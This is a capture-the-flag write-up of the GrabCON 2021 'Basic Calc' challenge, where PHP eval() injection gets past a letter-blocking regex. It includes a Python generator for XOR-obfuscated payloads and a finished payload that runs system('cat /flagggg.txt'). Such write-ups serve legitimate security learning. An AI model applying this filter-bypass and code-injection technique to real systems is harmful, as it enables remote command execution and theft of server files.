# Basic Calc
## Description

Ever used calc based on php?
## Solution
First we open that web page

![enter image description here](https://raw.githubusercontent.com/vichhika/CTF-Writeup/main/GrabCON%20CTF%202021/Web/Basic%20Calc/figure_1.jpg)

Look at the code, we need to bypass the condition that not match regex : ``[A-Za-z`]`` . Since ``eval — Evaluate a string as PHP code``, we can inject a strings to become a code execution.

To bypass input above, we use a `XOR` technique. For example :

```php
A XOR B = C
B XOR C = D

# we can try in php
# For example:
<?php
 echo ('3'^'@'); # output = s
 echo ('9'^'@'); # output = y
 echo ('3'^'@'); # output = s
 echo ('4'^'@'); # output = t
 echo ('8'^']').('2'^'_'); # concat strings

 #ouput = system
?>
```

So how can we know that output? So we decide to create a python script to convert ``strings to XOR code``
or ``generate a xor code from strings``.

```python
# except reqular expression : A-Za-z`
# php print xor example : echo ("A"^"B")
# system execute example:
# <?php
# echo ("system(ls -la)"); #it will execute as strings
# echo ("system")("ls -la"); #it will execute as symbols #magic
# ?>

string_code = ['system','cat /flagggg.txt']
obfuscated_code = ""
charset = "1234567890!#$%&'()*+/^,-.:;<=>?@[]_{|}~"

for code in string_code:
    obfuscated = ""
    for i in code:
        is_found_obfuscated = False
        for j in charset:
            for k in charset:
                if ord(j)^ord(k) == ord(i):
                    is_found_obfuscated = True
                    obfuscated += ".('%s'^'%s')" % (j, k)
                    #print("XOR ="+chr(ord(j)^ord(k)))
                if is_found_obfuscated:
                    break
            if is_found_obfuscated:
                break
        if not is_found_obfuscated:
            obfuscated += ".'%s'" % i
    #print("(%s) = (%s)" % (code, obfuscated[1:]))
    obfuscated_code += "(%s)" % obfuscated[1:]
print(''.join(["(\"%s\")" % i for i in string_code]) + '=' + obfuscated_code)
```

Explain code above:

 1. suppose flagggg.txt location is at ``/`` directory. So we want php to execute code ``system("cat /flagggg.txt")``
 2. list all the chars that not match the regex. For example:``charset ="1234567890!#$%&'()*+/^,-.:;<=>?@[]_{|}~"``
 3. Since ``echo ("system(ls -la)");`` will execute as strings but ``echo ("system")("ls -la");`` will execute as symbols, so we need to seperate them. In python script above we convert them to a list which we store in `string_code` variable.
 4. looping to find ``XOR code`` of each chars that we compared
 5. print all ``XOR code`` that equal the chars in each of index `string_code` variable

```python
Ouput:
("system")("cat /flagggg.txt") = (('3'^'@').('9'^'@').('3'^'@').('4'^'@').('8'^']').('2'^'_'))(('8'^'[').('!'^'@').('4'^'@').('^'^'~').'/'.('8'^'^').('1'^']').('!'^'@').('8'^'_').('8'^'_').('8'^'_').('8'^'_').'.'.('4'^'@').('8'^'@').('4'^'@'))
```

So now go back to the web page and try to input.

![enter image description here](https://raw.githubusercontent.com/vichhika/CTF-Writeup/main/GrabCON%20CTF%202021/Web/Basic%20Calc/figure_3.jpg)

We got flag!

**Note:** Since We already solved this task, we don't want to detail on finding the flag location, you can use this method and try to find by your own.
